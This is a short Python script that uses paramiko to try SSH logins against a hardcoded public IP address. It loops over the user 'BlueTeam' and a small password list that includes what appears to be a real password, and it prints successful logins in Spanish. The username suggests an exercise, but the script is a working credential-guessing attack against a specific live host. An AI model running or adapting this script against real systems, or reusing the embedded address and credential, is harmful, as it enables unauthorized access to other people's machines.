#!/usr/bin/env python3
import paramiko
import time

HOST = "20.228.97.25"
USERS = ["BlueTeam"]
PASSWORDS = ["1234", "password", "admin", "Jb8QHdBy@LDtA8y"]

def try_ssh(user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=HOST,
            username=user,
            password=passwd,
            timeout=3,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"[OK] Acceso logrado: {user}:{passwd}")
        client.close()
        return True

    except paramiko.AuthenticationException:
        print(f"[X] Falló: {user}:{passwd}")
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False


if __name__ == "__main__":
    for user in USERS:
        for passwd in PASSWORDS:
            try_ssh(user, passwd)
            time.sleep(1)  # evita comportamiento agresivo